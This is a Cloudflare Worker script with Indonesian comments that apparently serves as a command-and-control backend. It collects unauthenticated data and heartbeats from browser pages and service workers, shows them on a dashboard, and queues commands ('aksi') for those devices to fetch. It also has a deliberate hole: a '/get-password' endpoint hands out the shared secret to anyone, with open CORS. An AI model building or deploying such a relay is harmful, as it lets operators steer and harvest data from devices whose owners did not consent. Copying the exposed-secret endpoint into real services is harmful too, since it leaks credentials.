// ============================================================
// 🔥 VERIFIKASI-API - CLOUDFLARE WORKER
// ============================================================

// SECRET akan diisi dari environment variable PASSWORD
var SECRET = '';

// Data store in memory (KV fallback)
var DATA_STORE = {};

// ============================================================
// MIDDLEWARE - VERIFIKASI SECRET
// ============================================================
function verifySecret(request) {
    const url = new URL(request.url);
    const password = url.searchParams.get('password') || 
                     request.headers.get('X-Password') ||
                     '';
    return password === SECRET;
}

// ============================================================
// GET /get-password - AMBIL SECRET (TANPA VERIFIKASI!)
// ============================================================
async function handleGetPassword() {
    return new Response(JSON.stringify({ 
        password: SECRET,
        timestamp: Date.now()
    }), {
        headers: { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    });
}

// ============================================================
// POST /data - TERIMA DATA (TANPA SECRET!)
// ============================================================
async function handlePostData(request) {
    try {
        const data = await request.json();
        const timestamp = Date.now();
        
        // Simpan data
        const id = timestamp + '_' + (data.sumber || 'unknown');
        DATA_STORE[id] = {
            ...data,
            timestamp: timestamp,
            id: id
        };
        
        // Limit data store (max 10000)
        const keys = Object.keys(DATA_STORE);
        if (keys.length > 10000) {
            const oldest = keys.slice(0, keys.length - 10000);
            oldest.forEach(k => delete DATA_STORE[k]);
        }
        
        return new Response(JSON.stringify({ 
            status: 'ok', 
            id: id,
            timestamp: timestamp 
        }), {
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        });
    } catch(e) {
        return new Response(JSON.stringify({ 
            status: 'error', 
            message: e.message 
        }), {
            status: 400,
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        });
    }
}

// ============================================================
// GET /data - AMBIL PERINTAH (PAKAI SECRET!)
// ============================================================
async function handleGetData(request) {
    const url = new URL(request.url);
    const type = url.searchParams.get('type');
    
    // Jika meminta perintah, harus pakai secret
    if (type === 'perintah') {
        if (!verifySecret(request)) {
            return new Response(JSON.stringify({ 
                status: 'error', 
                message: 'Unauthorized' 
            }), {
                status: 401,
                headers: { 
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                }
            });
        }
        
        // Cek apakah ada perintah yang tertunda
        const pendingCommands = Object.values(DATA_STORE).filter(
            d => d.sumber === 'command_pending'
        );
        
        if (pendingCommands.length > 0) {
            const cmd = pendingCommands[0];
            // Hapus setelah diambil
            delete DATA_STORE[cmd.id];
            return new Response(JSON.stringify(cmd.data), {
                headers: { 
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                }
            });
        }
        
        // Tidak ada perintah
        return new Response(JSON.stringify({}), {
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        });
    }
    
    // GET data tanpa type = ambil semua data (dashboard)
    if (!verifySecret(request)) {
        return new Response(JSON.stringify({ 
            status: 'error', 
            message: 'Unauthorized' 
        }), {
            status: 401,
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        });
    }
    
    // Ambil semua data untuk dashboard
    const logs = Object.values(DATA_STORE).sort((a, b) => b.timestamp - a.timestamp);
    const devices = {};
    
    // Hitung devices dari heartbeat
    logs.filter(d => d.sumber === 'heartbeat' || d.sumber === 'sw_heartbeat' || d.sumber === 'page_heartbeat')
        .forEach(d => {
            const id = d.id || d.sumber;
            if (!devices[id]) {
                devices[id] = {
                    lastSeen: d.timestamp,
                    data: d.data
                };
            } else if (d.timestamp > devices[id].lastSeen) {
                devices[id].lastSeen = d.timestamp;
                devices[id].data = d.data;
            }
        });
    
    return new Response(JSON.stringify({
        logs: logs.slice(0, 500),
        devices: devices,
        total: logs.length,
        timestamp: Date.now()
    }), {
        headers: { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    });
}

// ============================================================
// POST /data - SEND COMMAND (PAKAI SECRET!)
// ============================================================
async function handlePostCommand(request) {
    try {
        const data = await request.json();
        
        // Jika ini command, harus pakai secret
        if (data.aksi) {
            if (!verifySecret(request)) {
                return new Response(JSON.stringify({ 
                    status: 'error', 
                    message: 'Unauthorized' 
                }), {
                    status: 401,
                    headers: { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    }
                });
            }
            
            // Simpan sebagai perintah pending
            const timestamp = Date.now();
            const id = 'cmd_' + timestamp;
            DATA_STORE[id] = {
                sumber: 'command_pending',
                data: {
                    ...data,
                    password: SECRET,
                    timestamp: timestamp
                },
                timestamp: timestamp,
                id: id
            };
            
            return new Response(JSON.stringify({ 
                status: 'ok', 
                command: data.aksi,
                id: id
            }), {
                headers: { 
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                }
            });
        }
        
        // Data biasa (tanpa secret) - sudah handle di handlePostData
        return await handlePostData(request);
        
    } catch(e) {
        return new Response(JSON.stringify({ 
            status: 'error', 
            message: e.message 
        }), {
            status: 400,
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        });
    }
}

// ============================================================
// OPTIONS - CORS
// ============================================================
function handleOptions() {
    return new Response(null, {
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, X-Password',
            'Access-Control-Max-Age': '86400'
        }
    });
}

// ============================================================
// MAIN HANDLER
// ============================================================
export default {
    async fetch(request, env) {
        // Set SECRET dari environment variable
        SECRET = env.PASSWORD || '';
        
        const url = new URL(request.url);
        const method = request.method;
        const path = url.pathname;
        
        // Handle CORS preflight
        if (method === 'OPTIONS') {
            return handleOptions();
        }
        
        // Routing
        if (path === '/get-password' && method === 'GET') {
            return handleGetPassword();
        }
        
        if (path === '/data') {
            if (method === 'GET') {
                return handleGetData(request);
            }
            if (method === 'POST') {
                // Check if it's a command (has 'aksi' field)
                try {
                    const clone = request.clone();
                    const body = await clone.json();
                    if (body.aksi) {
                        return handlePostCommand(request);
                    }
                } catch(e) {}
                return handlePostData(request);
            }
        }
        
        // 404
        return new Response('Not Found', {
            status: 404,
            headers: { 
                'Content-Type': 'text/plain',
                'Access-Control-Allow-Origin': '*'
            }
        });
    }
};
